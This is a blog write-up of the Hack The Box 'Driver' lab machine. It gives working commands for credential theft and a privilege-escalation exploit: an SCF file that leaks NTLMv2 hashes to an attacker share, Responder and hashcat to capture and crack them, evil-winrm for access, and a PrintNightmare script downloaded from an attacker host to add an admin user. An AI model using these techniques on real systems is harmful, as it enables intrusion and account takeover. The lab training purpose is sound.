@@ -1,0 +1,206 @@
+---
+title: "Driver Hackthebox writeup"
+author: "0xMesbaha"
+cover: "/media/Driver/20220226105919.png"
+tags: ["Hackthebox", "print nigthmare" , "scf attacks" ,"evil-winrm"]
+date: 2022-02-25T00:45:08+02:00
+draft: false
+---
+
+In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture
+the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in
+except the smb shares aren't accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service "spooler" and add a user in the administrator group.
+
+<!--more-->
+
+
+## Scanning :
+
+
+```bash
+nmap -T 4 -A -sV 10.10.11.106  -oN nmap_intial.txt
+```
+
+output :
+
+```bash
+PORT    STATE SERVICE      VERSION
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-auth:
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn\'t have a title (text/html; charset=UTF-8).
+
+135/tcp open  msrpc        Microsoft Windows RPC
+445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h17m43s, deviation: 0s, median: 7h17m43s
+| smb-security-mode:
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+```
+
+we can also run full port scan and will get  :
+
+```bash
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+445/tcp  open  microsoft-ds
+5985/tcp open  wsman
+```
+
+we have this port **5985** open , which we may utilize later [check](https://hacktricks.boitatech.com.br/pentesting/5985-5986-pentesting-winrm).
+
+
+## Enumeration:
+
+we can start by visiting the web page and it will ask us for a username:password for  MFP firmware update center .
+
+
+![image](/media/Driver/20220226110700.png)
+
+searching for MFP will find it stands for multi functioning printer , we can search for default credentials and find it is **"admin:admin"**
+
+using them will login successfully :
+
+![image](/media/Driver/20220226111149.png)
+
+- we can add "driver.htb" to the  ``/etc/hosts`` and start fuzzing for any Vhosts but will find none.
+
+- let's navigate around this site will find option Firmware Updates is working and asking for updating firmware
+
+![image](/media/Driver/20220226111320.png)
+
+- we should now think about uploading some malicious file to gain a reverse shell , however it won't work.
+- we can enumerate SMB that we have found earlier maybe will give us a lead  
+- ACCESS_DENIED  from  ``smbclient -L //driver.htb``
+
+- it seems SMB is running  for the printer that is shared among the network  
+
+
+
+### SMB authentication :
+
+
+- according to Microsoft Documentation :
+
+```
+NTLM and the older LAN Manager (LM) encryption are supported by Microsoft SMB Protocol. Both encryption methods use challenge-response authentication, where the server sends the client a random string and the client returns a computed response string that proves the client has sufficient credentials for access.
+```
+
+- so if the client (the target) tries to connect to us (attacker) the NTLM hash will be used to authenticate and then we can capture it with [Responder](https://github.com/lgandx/Responder) tool.
+
+- and as the firmwares are checked when the file we upload is loaded at the reviewer file explorer or if he clicked it we can get the hash we need.
+
+
+### Exploitation :
+
+- searching for "smb share and printer firmware update exploit" will find this blog  [here](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
+- so creating the payload :
+
+```cmd
+[Shell]
+Command=2
+IconFile=\\<ip>\share\Mesbaha.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+and name it as ``"@hack.scf"`` and before uploading it run Responder to capture the hash (hopefully):
+
+```bash
+sudo responder -I tun0 -rdwv
+```
+
+GREAT we have NTLMv2 hash now  :
+
+![image](/media/Driver/20220226114609.png)
+
+now we can try to crack it with hashcat  :
+
+```bash
+hashcat -m 5600 tony_hash  /usr/share/wordlists/rockyou.txt
+```
+
+![image](/media/Driver/20220226114733.png)
+
+so we have username and password , now How can we login ?
+
+## Foothold :
+
+- Most of the **impacket** tools that  takes username:password and try to login depends on SMB shares (i.e : ``ADMIN$`` and ``C$``) and hence they are not accessible they won't work .
+- Remember the port we have found in the full port scan ?
+- reading the blog article i have mentioned above
+
+```
+If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)
+```
+
+- and they mentioned tool : [evil-winrm](https://github.com/Hackplayers/evil-winrm) that can help us do this
+
+```bash
+./evil-winrm.rb -u tony -p liltony -i driver.htb
+```
+
+- and the user.txt is in tony's Desktop
+
+![image](/media/Driver/20220226115238.png)
+
+
+
+## Privilege escalation :
+
+- you can start uploading Winpeas and follow the output but i will try first some manual checks
+- first we know this Box is about printers and drivers maybe we find some exploit that way
+
+
+![image](/media/Driver/20220226115603.png)
+
+
+- in the Microsoft post is says we can run ``Get-Service -Name Spooler `` to check if it is running , and it is running
+
+
+![image](/media/Driver/20220226115710.png)
+
+- Hence the service is running indeed we can try to exploit it and see if it works  , there is this great one [here](https://github.com/JohnHammond/CVE-2021-34527) that we can try
+-  we can try to upload it then it will add for us a new user in Administrator group
+-  from machine side we can download the script from our http server with :
+-  **note** make sure you are in a writable directory
+
+```bash
+Invoke-WebRequest -Uri http://10.10.16.4:8888/CVE-2021-34527.ps1 -OutFile CVE.ps1
+```
+
+- running the exploit :
+
+```powershell
+Import-Module .\CVE.ps1
+Invoke-Nightmare -NewUser "0xMesbaha" -NewPassword "supersecretpassword123"
+```
+
+![image](/media/Driver/20220226120617.png)
+
+and our new user has been added we can try to login with "evil-winrm" as well :
+
+
+![image](/media/Driver/20220226120835.png)
+
+
+and if we run `` net user <user_added> `` will find :
+
+![image](/media/Driver/20220226120902.png)
+
+the  root flag is at Administrator Desktop .
+
+
+## Pwned  
